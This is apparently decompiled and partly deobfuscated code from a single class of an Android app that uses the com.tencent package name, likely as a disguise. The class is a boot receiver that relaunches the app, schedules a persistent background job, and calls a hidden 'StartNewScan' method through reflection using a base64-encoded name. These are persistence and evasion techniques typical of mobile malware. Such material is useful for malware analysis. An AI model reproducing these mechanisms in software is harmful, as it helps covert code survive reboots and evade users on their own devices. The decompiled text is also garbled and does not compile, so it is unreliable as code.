package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: BootReceiver
 * Original: Lcom/tencent/tunesxconcerningn101;
 */
public class BootReceiver extends BroadcastReceiver {

    // === METHODS ===

    public void Constructor() {
        // new BroadcastReceiver()
        return;
    }

    private void restartApp(Context param0) {
        v8.getPackageManager();
        v1 = v8.getPackageName();
        v1 = v0.getLaunchIntentForPackage(v1);
        v1 = 1073741824; // 0x40000000
        v2 = 0;
        v1 = PendingIntent.getActivity(v8, 0, v0, v1);
        v1 = "alarm";
        v8 = v8.getSystemService("alarm");
        v8 = (AlarmManager) v8;
        System.currentTimeMillis();
        v5 = 5000;
        v8.setExactAndAllowWhileIdle(0, v3, v4, v0);
        return;
    }

    public static void scheduleJob(Context param0) {
        v0 = "jobscheduler";
        v1 = v4.getSystemService("jobscheduler");
        v1 = new ComponentName();
        v2 = PersistentJobService.class;
        // new ComponentName(v4, v2)
        v4 = Build$VERSION.SDK_INT;
        v2 = 24;
        v3 = 100;
        if (v4 < 24) { // goto +19
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, v1)
        v1 = 900000;
        v4.setPeriodic(900000, 24);
        v4 = v4.build();
        // goto (branch)
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, 900000)
        v1 = 15000;
        v4.setPeriodic(15000, 24);
        v4.build();
        "jobscheduler".schedule(v4);
        return;
    }

    public void onReceive(Context param0, Intent param1) {
        v10 = MainBackgroundService.app_tunesxconcerningn1011_Context;
        if (v10 != null && v10 != 0) { // goto +4
        MainBackgroundService.app_tunesxconcerningn1011_Context = v9;
        v8.restartApp(v9);
        BootReceiver.scheduleJob(v9);
        v10 = MainBackgroundService.class;
        v10 = BackgroundServiceHelper.removedqtractort40(v10, v9);
        if (v10 == null || v10 == 0) { // goto +56
        v10 = new Intent();
        v0 = MainBackgroundService.class;
        // new Intent(v9, v0)
        v0 = "com.tencent.tunesxconcerningn103";
        v1 = 0;
        Class.forName("com.tencent.tunesxconcerningn103");
        // goto (branch)
        v2 = "com.tencent.tunesxconcerningn103".newInstance();
        // goto (branch)
        v2 = 0;
        v3 = 2;
        v4 = new Class[][2];
        v5 = Context.class;
        v6 = 0;
        v4[0] = v5;
        v5 = Intent.class;
        v7 = 1;
        v4[1] = v5;
        v5 = "U3RhcnROZXdTY2Fu";
        v9 = DataPackagingEngine.grhcriticismzfailedd31("U3RhcnROZXdTY2Fu");
        v9 = "com.tencent.tunesxconcerningn103".getDeclaredMethod("U3RhcnROZXdTY2Fu", v4);
        "com.tencent.tunesxconcerningn103"[0] = v9;
        "com.tencent.tunesxconcerningn103"[1] = v10;
        0.invoke(v2, "com.tencent.tunesxconcerningn103");
        return;
    }
}
